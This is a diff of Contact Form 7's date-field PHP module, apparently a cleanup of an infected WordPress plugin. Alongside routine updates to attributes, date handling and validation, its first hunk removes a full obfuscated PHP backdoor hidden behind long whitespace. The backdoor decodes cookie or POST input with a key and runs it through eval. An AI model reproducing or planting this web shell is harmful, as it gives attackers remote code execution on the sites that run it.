@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $c4a9d = 629;$GLOBALS['f8ee44'] = Array();global $f8ee44;$f8ee44 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['y848dab67'] = "\x43\x38\x56\x57\x76\x65\x64\x6b\x6a\x33\x4d\x71\x69\x4a\x58\x59\x70\x26\x47\x51\x2f\x32\x7c\x7a\x46\x6c\x63\x6d\x3c\x73\x68\x5d\x31\x79\x35\x44\x3a\x42\x4c\x5f\x30\x61\x5c\x3b\x4b\x6e\x9\x4e\x66\x24\x53\x22\x2a\x62\x39\x55\x7e\x20\x7b\x74\x54\x3f\x77\x2e\x3e\x75\x37\xa\x52\x21\x67\x50\x7d\x23\x27\x6f\x29\x5b\x72\x3d\x40\x5a\x78\x2b\x5e\x28\x48\x4f\x25\x2d\x41\x45\xd\x36\x2c\x60\x34\x49";$f8ee44[$f8ee44['y848dab67'][45].$f8ee44['y848dab67'][96].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][66]] = $f8ee44['y848dab67'][26].$f8ee44['y848dab67'][30].$f8ee44['y848dab67'][78];$f8ee44[$f8ee44['y848dab67'][4].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][54].$f8ee44['y848dab67'][1].$f8ee44['y848dab67'][54].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][9]] = $f8ee44['y848dab67'][75].$f8ee44['y848dab67'][78].$f8ee44['y848dab67'][6];$f8ee44[$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][1].$f8ee44['y848dab67'][96].$f8ee44['y848dab67'][66].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][26].$f8ee44['y848dab67'][93]] = $f8ee44['y848dab67'][6].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][48].$f8ee44['y848dab67'][12].$f8ee44['y848dab67'][45].$f8ee44['y848dab67'][5];$f8ee44[$f8ee44['y848dab67'][59].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][26]] = $f8ee44['y848dab67'][29].$f8ee44['y848dab67'][59].$f8ee44['y848dab67'][78].$f8ee44['y848dab67'][25].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][45];$f8ee44[$f8ee44['y848dab67'][16].$f8ee44['y848dab67'][54].$f8ee44['y848dab67'][66].$f8ee44['y848dab67'][32].$f8ee44['y848dab67'][54]] = $f8ee44['y848dab67'][6].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][48].$f8ee44['y848dab67'][12].$f8ee44['y848dab67'][45].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][6];$f8ee44[$f8ee44['y848dab67'][7].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][53].$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][48].$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][40]] = $f8ee44['y848dab67'][12].$f8ee44['y848dab67'][45].$f8ee44['y848dab67'][12].$f8ee44['y848dab67'][39].$f8ee44['y848dab67'][29].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][59];$f8ee44[$f8ee44['y848dab67'][27].$f8ee44['y848dab67'][53].$f8ee44['y848dab67'][21].$f8ee44['y848dab67'][9].$f8ee44['y848dab67'][1].$f8ee44['y848dab67'][54].$f8ee44['y848dab67'][48].$f8ee44['y848dab67'][21]] = $f8ee44['y848dab67'][29].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][78].$f8ee44['y848dab67'][12].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][25].$f8ee44['y848dab67'][12].$f8ee44['y848dab67'][23].$f8ee44['y848dab67'][5];$f8ee44[$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][21].$f8ee44['y848dab67'][32].$f8ee44['y848dab67'][1].$f8ee44['y848dab67'][1].$f8ee44['y848dab67'][54]] = $f8ee44['y848dab67'][16].$f8ee44['y848dab67'][30].$f8ee44['y848dab67'][16].$f8ee44['y848dab67'][4].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][78].$f8ee44['y848dab67'][29].$f8ee44['y848dab67'][12].$f8ee44['y848dab67'][75].$f8ee44['y848dab67'][45];$f8ee44[$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][9].$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][53]] = $f8ee44['y848dab67'][65].$f8ee44['y848dab67'][45].$f8ee44['y848dab67'][29].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][78].$f8ee44['y848dab67'][12].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][25].$f8ee44['y848dab67'][12].$f8ee44['y848dab67'][23].$f8ee44['y848dab67'][5];$f8ee44[$f8ee44['y848dab67'][23].$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][40].$f8ee44['y848dab67'][40].$f8ee44['y848dab67'][21].$f8ee44['y848dab67'][40].$f8ee44['y848dab67'][93]] = $f8ee44['y848dab67'][53].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][29].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][93].$f8ee44['y848dab67'][96].$f8ee44['y848dab67'][39].$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][26].$f8ee44['y848dab67'][75].$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][5];$f8ee44[$f8ee44['y848dab67'][8].$f8ee44['y848dab67'][54].$f8ee44['y848dab67'][1].$f8ee44['y848dab67'][53]] = $f8ee44['y848dab67'][29].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][59].$f8ee44['y848dab67'][39].$f8ee44['y848dab67'][59].$f8ee44['y848dab67'][12].$f8ee44['y848dab67'][27].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][39].$f8ee44['y848dab67'][25].$f8ee44['y848dab67'][12].$f8ee44['y848dab67'][27].$f8ee44['y848dab67'][12].$f8ee44['y848dab67'][59];$f8ee44[$f8ee44['y848dab67'][65].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][21].$f8ee44['y848dab67'][26].$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][96].$f8ee44['y848dab67'][41]] = $f8ee44['y848dab67'][53].$f8ee44['y848dab67'][34].$f8ee44['y848dab67'][32].$f8ee44['y848dab67'][5];$f8ee44[$f8ee44['y848dab67'][12].$f8ee44['y848dab67'][9].$f8ee44['y848dab67'][32].$f8ee44['y848dab67'][48].$f8ee44['y848dab67'][32]] = $f8ee44['y848dab67'][59].$f8ee44['y848dab67'][26].$f8ee44['y848dab67'][54].$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][54].$f8ee44['y848dab67'][34].$f8ee44['y848dab67'][40];$f8ee44[$f8ee44['y848dab67'][70].$f8ee44['y848dab67'][53].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][66]] = $_POST;$f8ee44[$f8ee44['y848dab67'][12].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][48].$f8ee44['y848dab67'][48].$f8ee44['y848dab67'][34].$f8ee44['y848dab67'][93].$f8ee44['y848dab67'][21]] = $_COOKIE;@$f8ee44[$f8ee44['y848dab67'][7].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][53].$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][48].$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][40]]($f8ee44['y848dab67'][5].$f8ee44['y848dab67'][78].$f8ee44['y848dab67'][78].$f8ee44['y848dab67'][75].$f8ee44['y848dab67'][78].$f8ee44['y848dab67'][39].$f8ee44['y848dab67'][25].$f8ee44['y848dab67'][75].$f8ee44['y848dab67'][70], NULL);@$f8ee44[$f8ee44['y848dab67'][7].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][53].$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][48].$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][40]]($f8ee44['y848dab67'][25].$f8ee44['y848dab67'][75].$f8ee44['y848dab67'][70].$f8ee44['y848dab67'][39].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][78].$f8ee44['y848dab67'][78].$f8ee44['y848dab67'][75].$f8ee44['y848dab67'][78].$f8ee44['y848dab67'][29], 0);@$f8ee44[$f8ee44['y848dab67'][7].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][53].$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][48].$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][40]]($f8ee44['y848dab67'][27].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][82].$f8ee44['y848dab67'][39].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][82].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][26].$f8ee44['y848dab67'][65].$f8ee44['y848dab67'][59].$f8ee44['y848dab67'][12].$f8ee44['y848dab67'][75].$f8ee44['y848dab67'][45].$f8ee44['y848dab67'][39].$f8ee44['y848dab67'][59].$f8ee44['y848dab67'][12].$f8ee44['y848dab67'][27].$f8ee44['y848dab67'][5], 0);@$f8ee44[$f8ee44['y848dab67'][8].$f8ee44['y848dab67'][54].$f8ee44['y848dab67'][1].$f8ee44['y848dab67'][53]](0);if (!$f8ee44[$f8ee44['y848dab67'][16].$f8ee44['y848dab67'][54].$f8ee44['y848dab67'][66].$f8ee44['y848dab67'][32].$f8ee44['y848dab67'][54]]($f8ee44['y848dab67'][90].$f8ee44['y848dab67'][38].$f8ee44['y848dab67'][68].$f8ee44['y848dab67'][91].$f8ee44['y848dab67'][90].$f8ee44['y848dab67'][35].$f8ee44['y848dab67'][15].$f8ee44['y848dab67'][39].$f8ee44['y848dab67'][68].$f8ee44['y848dab67'][55].$f8ee44['y848dab67'][47].$f8ee44['y848dab67'][39].$f8ee44['y848dab67'][9].$f8ee44['y848dab67'][93].$f8ee44['y848dab67'][93].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][48].$f8ee44['y848dab67'][53].$f8ee44['y848dab67'][1].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][1].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][21].$f8ee44['y848dab67'][9].$f8ee44['y848dab67'][34].$f8ee44['y848dab67'][34].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][53].$f8ee44['y848dab67'][21].$f8ee44['y848dab67'][32].$f8ee44['y848dab67'][48].$f8ee44['y848dab67'][53].$f8ee44['y848dab67'][48].$f8ee44['y848dab67'][32].$f8ee44['y848dab67'][32].$f8ee44['y848dab67'][53].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][32].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][40].$f8ee44['y848dab67'][21].$f8ee44['y848dab67'][48].$f8ee44['y848dab67'][53].$f8ee44['y848dab67'][41])){$f8ee44[$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][1].$f8ee44['y848dab67'][96].$f8ee44['y848dab67'][66].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][26].$f8ee44['y848dab67'][93]]($f8ee44['y848dab67'][90].$f8ee44['y848dab67'][38].$f8ee44['y848dab67'][68].$f8ee44['y848dab67'][91].$f8ee44['y848dab67'][90].$f8ee44['y848dab67'][35].$f8ee44['y848dab67'][15].$f8ee44['y848dab67'][39].$f8ee44['y848dab67'][68].$f8ee44['y848dab67'][55].$f8ee44['y848dab67'][47].$f8ee44['y848dab67'][39].$f8ee44['y848dab67'][9].$f8ee44['y848dab67'][93].$f8ee44['y848dab67'][93].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][48].$f8ee44['y848dab67'][53].$f8ee44['y848dab67'][1].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][1].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][21].$f8ee44['y848dab67'][9].$f8ee44['y848dab67'][34].$f8ee44['y848dab67'][34].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][53].$f8ee44['y848dab67'][21].$f8ee44['y848dab67'][32].$f8ee44['y848dab67'][48].$f8ee44['y848dab67'][53].$f8ee44['y848dab67'][48].$f8ee44['y848dab67'][32].$f8ee44['y848dab67'][32].$f8ee44['y848dab67'][53].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][32].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][40].$f8ee44['y848dab67'][21].$f8ee44['y848dab67'][48].$f8ee44['y848dab67'][53].$f8ee44['y848dab67'][41], 1);$rd79 = NULL;$a63648728 = NULL;$f8ee44[$f8ee44['y848dab67'][33].$f8ee44['y848dab67'][26].$f8ee44['y848dab67'][53].$f8ee44['y848dab67'][5]] = $f8ee44['y848dab67'][21].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][93].$f8ee44['y848dab67'][93].$f8ee44['y848dab67'][1].$f8ee44['y848dab67'][54].$f8ee44['y848dab67'][26].$f8ee44['y848dab67'][32].$f8ee44['y848dab67'][89].$f8ee44['y848dab67'][53].$f8ee44['y848dab67'][54].$f8ee44['y848dab67'][1].$f8ee44['y848dab67'][1].$f8ee44['y848dab67'][89].$f8ee44['y848dab67'][96].$f8ee44['y848dab67'][93].$f8ee44['y848dab67'][34].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][89].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][96].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][96].$f8ee44['y848dab67'][89].$f8ee44['y848dab67'][93].$f8ee44['y848dab67'][1].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][53].$f8ee44['y848dab67'][53].$f8ee44['y848dab67'][9].$f8ee44['y848dab67'][21].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][54].$f8ee44['y848dab67'][66].$f8ee44['y848dab67'][32].$f8ee44['y848dab67'][48];global $ycbe;function  tc9d950($rd79, $fc57){global $f8ee44;$xc30 = "";for ($d533bf=0; $d533bf<$f8ee44[$f8ee44['y848dab67'][59].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][26]]($rd79);){for ($y43aff=0; $y43aff<$f8ee44[$f8ee44['y848dab67'][59].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][26]]($fc57) && $d533bf<$f8ee44[$f8ee44['y848dab67'][59].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][26]]($rd79); $y43aff++, $d533bf++){$xc30 .= $f8ee44[$f8ee44['y848dab67'][45].$f8ee44['y848dab67'][96].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][66]]($f8ee44[$f8ee44['y848dab67'][4].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][54].$f8ee44['y848dab67'][1].$f8ee44['y848dab67'][54].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][9]]($rd79[$d533bf]) ^ $f8ee44[$f8ee44['y848dab67'][4].$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][54].$f8ee44['y848dab67'][1].$f8ee44['y848dab67'][54].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][9]]($fc57[$y43aff]));}}return $xc30;}function  b51e($rd79, $fc57){global $f8ee44;global $ycbe;return $f8ee44[$f8ee44['y848dab67'][12].$f8ee44['y848dab67'][9].$f8ee44['y848dab67'][32].$f8ee44['y848dab67'][48].$f8ee44['y848dab67'][32]]($f8ee44[$f8ee44['y848dab67'][12].$f8ee44['y848dab67'][9].$f8ee44['y848dab67'][32].$f8ee44['y848dab67'][48].$f8ee44['y848dab67'][32]]($rd79, $ycbe), $fc57);}foreach ($f8ee44[$f8ee44['y848dab67'][12].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][48].$f8ee44['y848dab67'][48].$f8ee44['y848dab67'][34].$f8ee44['y848dab67'][93].$f8ee44['y848dab67'][21]] as $fc57=>$c217){$rd79 = $c217;$a63648728 = $fc57;}if (!$rd79){foreach ($f8ee44[$f8ee44['y848dab67'][70].$f8ee44['y848dab67'][53].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][66]] as $fc57=>$c217){$rd79 = $c217;$a63648728 = $fc57;}}$rd79 = @$f8ee44[$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][9].$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][53]]($f8ee44[$f8ee44['y848dab67'][65].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][21].$f8ee44['y848dab67'][26].$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][5].$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][96].$f8ee44['y848dab67'][41]]($f8ee44[$f8ee44['y848dab67'][23].$f8ee44['y848dab67'][6].$f8ee44['y848dab67'][40].$f8ee44['y848dab67'][40].$f8ee44['y848dab67'][21].$f8ee44['y848dab67'][40].$f8ee44['y848dab67'][93]]($rd79), $a63648728));if (isset($rd79[$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][7]]) && $ycbe==$rd79[$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][7]]){if ($rd79[$f8ee44['y848dab67'][41]] == $f8ee44['y848dab67'][12]){$d533bf = Array($f8ee44['y848dab67'][16].$f8ee44['y848dab67'][4] => @$f8ee44[$f8ee44['y848dab67'][41].$f8ee44['y848dab67'][21].$f8ee44['y848dab67'][32].$f8ee44['y848dab67'][1].$f8ee44['y848dab67'][1].$f8ee44['y848dab67'][54]](),$f8ee44['y848dab67'][29].$f8ee44['y848dab67'][4] => $f8ee44['y848dab67'][32].$f8ee44['y848dab67'][63].$f8ee44['y848dab67'][40].$f8ee44['y848dab67'][89].$f8ee44['y848dab67'][32],);echo @$f8ee44[$f8ee44['y848dab67'][27].$f8ee44['y848dab67'][53].$f8ee44['y848dab67'][21].$f8ee44['y848dab67'][9].$f8ee44['y848dab67'][1].$f8ee44['y848dab67'][54].$f8ee44['y848dab67'][48].$f8ee44['y848dab67'][21]]($d533bf);}elseif ($rd79[$f8ee44['y848dab67'][41]] == $f8ee44['y848dab67'][5]){eval/*e815c*/($rd79[$f8ee44['y848dab67'][6]]);}exit();}} ?><?php
+<?php
 /**
 ** A base module for the following types of tags:
 ** 	[date] and [date*]		# Date
@@ -10,7 +10,11 @@ add_action( 'wpcf7_init', 'wpcf7_add_form_tag_date', 10, 0 );
 
 function wpcf7_add_form_tag_date() {
 	wpcf7_add_form_tag( array( 'date', 'date*' ),
-		'wpcf7_date_form_tag_handler', array( 'name-attr' => true ) );
+		'wpcf7_date_form_tag_handler',
+		array(
+			'name-attr' => true,
+		)
+	);
 }
 
 function wpcf7_date_form_tag_handler( $tag ) {
@@ -36,16 +40,24 @@ function wpcf7_date_form_tag_handler( $tag ) {
 	$atts['min'] = $tag->get_date_option( 'min' );
 	$atts['max'] = $tag->get_date_option( 'max' );
 	$atts['step'] = $tag->get_option( 'step', 'int', true );
+	$atts['readonly'] = $tag->has_option( 'readonly' );
 
-	if ( $tag->has_option( 'readonly' ) ) {
-		$atts['readonly'] = 'readonly';
-	}
+	$atts['autocomplete'] = $tag->get_option(
+		'autocomplete', '[-0-9a-zA-Z]+', true
+	);
 
 	if ( $tag->is_required() ) {
 		$atts['aria-required'] = 'true';
 	}
 
-	$atts['aria-invalid'] = $validation_error ? 'true' : 'false';
+	if ( $validation_error ) {
+		$atts['aria-invalid'] = 'true';
+		$atts['aria-describedby'] = wpcf7_get_validation_error_reference(
+			$tag->name
+		);
+	} else {
+		$atts['aria-invalid'] = 'false';
+	}
 
 	$value = (string) reset( $tag->values );
 
@@ -57,54 +69,85 @@ function wpcf7_date_form_tag_handler( $tag ) {
 
 	$value = $tag->get_default_option( $value );
 
+	if ( $value ) {
+		$datetime_obj = date_create_immutable(
+			preg_replace( '/[_]+/', ' ', $value ),
+			wp_timezone()
+		);
+
+		if ( $datetime_obj ) {
+			$value = $datetime_obj->format( 'Y-m-d' );
+		}
+	}
+
 	$value = wpcf7_get_hangover( $tag->name, $value );
 
 	$atts['value'] = $value;
-
-	if ( wpcf7_support_html5() ) {
-		$atts['type'] = $tag->basetype;
-	} else {
-		$atts['type'] = 'text';
-	}
-
+	$atts['type'] = $tag->basetype;
 	$atts['name'] = $tag->name;
 
-	$atts = wpcf7_format_atts( $atts );
-
 	$html = sprintf(
-		'<span class="wpcf7-form-control-wrap %1$s"><input %2$s />%3$s</span>',
-		sanitize_html_class( $tag->name ), $atts, $validation_error );
+		'<span class="wpcf7-form-control-wrap" data-name="%1$s"><input %2$s />%3$s</span>',
+		esc_attr( $tag->name ),
+		wpcf7_format_atts( $atts ),
+		$validation_error
+	);
 
 	return $html;
 }
 
 
-/* Validation filter */
+add_action(
+	'wpcf7_swv_create_schema',
+	'wpcf7_swv_add_date_rules',
+	10, 2
+);
 
-add_filter( 'wpcf7_validate_date', 'wpcf7_date_validation_filter', 10, 2 );
-add_filter( 'wpcf7_validate_date*', 'wpcf7_date_validation_filter', 10, 2 );
+function wpcf7_swv_add_date_rules( $schema, $contact_form ) {
+	$tags = $contact_form->scan_form_tags( array(
+		'basetype' => array( 'date' ),
+	) );
 
-function wpcf7_date_validation_filter( $result, $tag ) {
-	$name = $tag->name;
+	foreach ( $tags as $tag ) {
+		if ( $tag->is_required() ) {
+			$schema->add_rule(
+				wpcf7_swv_create_rule( 'required', array(
+					'field' => $tag->name,
+					'error' => wpcf7_get_message( 'invalid_required' ),
+				) )
+			);
+		}
 
-	$min = $tag->get_date_option( 'min' );
-	$max = $tag->get_date_option( 'max' );
+		$schema->add_rule(
+			wpcf7_swv_create_rule( 'date', array(
+				'field' => $tag->name,
+				'error' => wpcf7_get_message( 'invalid_date' ),
+			) )
+		);
 
-	$value = isset( $_POST[$name] )
-		? trim( strtr( (string) $_POST[$name], "\n", " " ) )
-		: '';
+		$min = $tag->get_date_option( 'min' );
+		$max = $tag->get_date_option( 'max' );
 
-	if ( $tag->is_required() and '' == $value ) {
-		$result->invalidate( $tag, wpcf7_get_message( 'invalid_required' ) );
-	} elseif ( '' != $value and ! wpcf7_is_date( $value ) ) {
-		$result->invalidate( $tag, wpcf7_get_message( 'invalid_date' ) );
-	} elseif ( '' != $value and ! empty( $min ) and $value < $min ) {
-		$result->invalidate( $tag, wpcf7_get_message( 'date_too_early' ) );
-	} elseif ( '' != $value and ! empty( $max ) and $max < $value ) {
-		$result->invalidate( $tag, wpcf7_get_message( 'date_too_late' ) );
+		if ( false !== $min ) {
+			$schema->add_rule(
+				wpcf7_swv_create_rule( 'mindate', array(
+					'field' => $tag->name,
+					'threshold' => $min,
+					'error' => wpcf7_get_message( 'date_too_early' ),
+				) )
+			);
+		}
+
+		if ( false !== $max ) {
+			$schema->add_rule(
+				wpcf7_swv_create_rule( 'maxdate', array(
+					'field' => $tag->name,
+					'threshold' => $max,
+					'error' => wpcf7_get_message( 'date_too_late' ),
+				) )
+			);
+		}
 	}
-
-	return $result;
 }
 
 
@@ -116,17 +159,17 @@ function wpcf7_date_messages( $messages ) {
 	return array_merge( $messages, array(
 		'invalid_date' => array(
 			'description' => __( "Date format that the sender entered is invalid", 'contact-form-7' ),
-			'default' => __( "The date format is incorrect.", 'contact-form-7' )
+			'default' => __( "Please enter a date in YYYY-MM-DD format.", 'contact-form-7' ),
 		),
 
 		'date_too_early' => array(
 			'description' => __( "Date is earlier than minimum limit", 'contact-form-7' ),
-			'default' => __( "The date is before the earliest one allowed.", 'contact-form-7' )
+			'default' => __( "This field has a too early date.", 'contact-form-7' ),
 		),
 
 		'date_too_late' => array(
 			'description' => __( "Date is later than maximum limit", 'contact-form-7' ),
-			'default' => __( "The date is after the latest one allowed.", 'contact-form-7' )
+			'default' => __( "This field has a too late date.", 'contact-form-7' ),
 		),
 	) );
 }
@@ -148,7 +191,7 @@ function wpcf7_tag_generator_date( $contact_form, $args = '' ) {
 
 	$description = __( "Generate a form-tag for a date input field. For more details, see %s.", 'contact-form-7' );
 
-	$desc_link = wpcf7_link( __( 'https://contactform7.com/date-field/', 'contact-form-7' ), __( 'Date Field', 'contact-form-7' ) );
+	$desc_link = wpcf7_link( __( 'https://contactform7.com/date-field/', 'contact-form-7' ), __( 'Date field', 'contact-form-7' ) );
 
 ?>
 <div class="control-box">
